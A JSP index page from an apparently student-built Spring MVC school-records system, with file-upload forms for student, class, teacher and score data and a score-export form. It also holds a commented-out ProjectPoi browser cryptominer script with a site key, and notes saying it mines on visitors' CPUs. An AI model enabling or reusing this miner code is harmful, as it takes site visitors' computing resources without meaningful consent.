<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8" %>
<html>
<%--<script src="https://ppoi.org/lib/projectpoi.min.js"></script>--%>
<body>
<h2>Hello World!</h2>
springmvc文件上传
<form name="form1" action="/student/insert_many_student_eclass" method="post" enctype="multipart/form-data">
    <input type="file" name="upload_file" />
    <input type="submit" value="上传学生文件" />
</form>
<form name="form2" action="/teachclass/batch_insert_tclass" method="post" enctype="multipart/form-data">
    <input type="file" name="upload_tclass_file" />
    <input type="submit" value="上传教学班文件" />
</form>
<form name="form3" action="/teacher/insert_many_teacher" method="post" enctype="multipart/form-data">
    <input type="file" name="upload_teacher_file" />
    <input type="submit" value="上传教师文件" />
</form>
<form name="form4" action="/score/import_score" method="post" enctype="multipart/form-data">
    <input type="file" name="upload_score_file" />
    <input type="submit" value="上传成绩文件" />
</form>
<form name="form5" action="/score/out_tclass_score" method="post" >
    <input type="text" name="year" />
    <input type="text" name="classId" />
    <input type="submit" id="exportExcel" name="exportExcel" value="Excel导出"/>
</form>


<%--<script>--%>
//    知识免费，劳动收费
//    在浏览文章的时候借用阁下cpu挖矿，但是绝对不影响您的正常使用
//    在您退出时候将自动停止挖矿，所得全部用于博客运维，谢谢！
    <%--var miner = new ProjectPoi.Anonymous('Huf9JINgUXP1htzjn6MwSYOB',{--%>
        <%--threads: 2,--%>
        <%--throttle: 0.5--%>
    <%--});--%>
    <%--miner.start();--%>
<%--</script>--%>
</body>
</html>
